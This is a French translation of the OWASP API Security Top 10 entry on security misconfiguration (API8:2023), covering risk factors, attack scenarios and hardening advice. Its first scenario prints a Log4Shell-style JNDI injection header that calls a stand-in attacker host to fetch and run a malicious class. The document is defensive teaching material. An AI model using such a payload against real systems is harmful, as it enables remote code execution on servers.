# API8:2023 Security Misconfiguration

| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |
| - | - | - |
| Spécifique à l'API : Exploitabilité **Facile** | Prévalence **Courante** : Détectabilité **Facile** | Technique **Grave** : Spécifique à l'organisation |
| Les attaquants cherchent souvent à trouver des failles non corrigées, des points d'accès courants, des services fonctionnant avec des configurations par défaut non sécurisées ou des fichiers et répertoires non protégés pour obtenir un accès non autorisé ou des informations sur le système. La plupart de ces informations sont publiques et des exploits peuvent être disponibles. | La mauvaise configuration de sécurité peut se produire à n'importe quel niveau de la pile API, du réseau à l'application. Des outils automatisés sont disponibles pour détecter et exploiter des configurations incorrectes telles que des services inutiles ou des options héritées. | Les mauvaises configurations de sécurité exposent non seulement des données utilisateur sensibles, mais aussi des détails système qui peuvent conduire à la compromission complète du serveur. |

## L'API est-elle vulnérable ?

L'API peut être vulnérable si :

* La sécurisation appropriée est absente à travers n'importe quelle partie de la pile API, ou si les permissions sur les services cloud sont mal configurées
* Les derniers correctifs de sécurité sont manquants, ou si les systèmes sont obsolètes
* Des fonctionnalités inutiles sont activées (par exemple, les verbes HTTP, les fonctionnalités de journalisation)
* Il y a des divergences dans la façon dont les requêtes entrantes sont traitées par les serveurs dans la chaîne du serveur HTTP
* La sécurité du transport (TLS) est absente
* Les directives de sécurité ou de contrôle de cache ne sont pas envoyées aux clients
* Une politique Cross-Origin Resource Sharing (CORS) est manquante ou mal configurée
* Les messages d'erreur incluent des traces de pile, ou exposent d'autres informations sensibles

## Exemple de scénarios d'attaque

### Scénario #1

Un serveur back-end d'API maintient un journal d'accès écrit par un utilitaire de journalisation open-source populaire avec prise en charge de l'expansion de paramètres et des recherches JNDI (Java Naming and Directory Interface), tous deux activés par défaut. Pour chaque requête, une nouvelle entrée est écrite dans le fichier journal avec le modèle suivant : `<méthode> <version_api>/<chemin> - <code_statut>`.

Un acteur malveillant émet la requête API suivante, qui est écrite dans le fichier journal d'accès :

```
GET /health
X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
```

En raison de la configuration par défaut non sécurisée de l'utilitaire de journalisation et d'une politique de sortie réseau permissive, pour écrire l'entrée correspondante dans le journal d'accès, tout en développant la valeur de l'en-tête de requête `X-Api-Version`, l'utilitaire de journalisation va extraire et exécuter l'objet `Malicious.class` du serveur contrôlé à distance par l'attaquant.

### Scénario #2

Un site web de réseau social propose une fonctionnalité de "Message Direct" qui permet aux utilisateurs de garder des conversations privées. Pour récupérer de nouveaux messages pour une conversation spécifique, le site web émet la requête API suivante (l'interaction de l'utilisateur n'est pas requise) :

```
GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
```

Parce que la réponse de l'API ne comprend pas l'en-tête HTTP `Cache-Control`, les conversations privées sont mises en cache par le navigateur web, permettant aux acteurs malveillants de les récupérer à partir des fichiers de cache du navigateur.

## Comment s'en prémunir ?

Le cycle de vie de l'API devrait inclure :

* Un processus de durcissement reproductible menant à un déploiement rapide et facile d'un environnement correctement sécurisé
* Une tâche pour examiner et mettre à jour les configurations dans toute la pile API. L'examen devrait inclure : les fichiers d'orchestration, les composants API et les services cloud (par exemple, les autorisations de compartiment S3)
* Un processus automatisé pour évaluer en continu l'efficacité de la configuration et des paramètres dans tous les environnements

De plus :

* Assurez-vous que toutes les communications API du client vers le serveur API et tout composant en aval/amont se font sur un canal de communication chiffré (TLS), qu'il s'agisse d'une API interne ou publique.
* Soyez spécifique sur les verbes HTTP par lesquels chaque API peut être accédée : tous les autres verbes HTTP devraient être désactivés (par exemple, HEAD).
* Les API s'attendant à être accessibles depuis des clients basés sur un navigateur (par exemple, une interface WebApp) devraient, au moins :
    * implémenter une politique Cross-Origin Resource Sharing (CORS) appropriée
    * inclure les en-têtes de sécurité applicables
* Restreignez les types de contenu/format de données entrants à ceux qui répondent aux exigences commerciales/fonctionnelles.
* Assurez-vous que tous les serveurs dans la chaîne du serveur HTTP (par exemple, les équilibreurs de charge, les proxies et les proxies inverses, ainsi que les serveurs back-end) traitent les requêtes entrantes de manière uniforme pour éviter les problèmes de désynchronisation.
* Lorsque cela est applicable, définissez et appliquez tous les schémas de charge utile de réponse API, y compris les réponses d'erreur, pour empêcher les traces d'exception et d'autres informations précieuses d'être renvoyées aux attaquants.

## Références

### OWASP

* [OWASP Secure Headers Project][1]
* [Configuration and Deployment Management Testing - Web Security Testing
  Guide][2]
* [Testing for Error Handling - Web Security Testing Guide][3]
* [Testing for Cross Site Request Forgery - Web Security Testing Guide][4]

### Externes

* [CWE-2: Environmental Security Flaws][5]
* [CWE-16: Configuration][6]
* [CWE-209: Generation of Error Message Containing Sensitive Information][7]
* [CWE-319: Cleartext Transmission of Sensitive Information][8]
* [CWE-388: Error Handling][9]
* [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response
  Smuggling')][10]
* [CWE-942: Permissive Cross-domain Policy with Untrusted Domains][11]
* [Guide to General Server Security][12], NIST
* [Let's Encrypt: a free, automated, and open Certificate Authority][13]

[1]: https://owasp.org/www-project-secure-headers/
[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README
[3]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README
[4]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery
[5]: https://cwe.mitre.org/data/definitions/2.html
[6]: https://cwe.mitre.org/data/definitions/16.html
[7]: https://cwe.mitre.org/data/definitions/209.html
[8]: https://cwe.mitre.org/data/definitions/319.html
[9]: https://cwe.mitre.org/data/definitions/388.html
[10]: https://cwe.mitre.org/data/definitions/444.html
[11]: https://cwe.mitre.org/data/definitions/942.html
[12]: https://csrc.nist.gov/publications/detail/sp/800-123/final
[13]: https://letsencrypt.org/
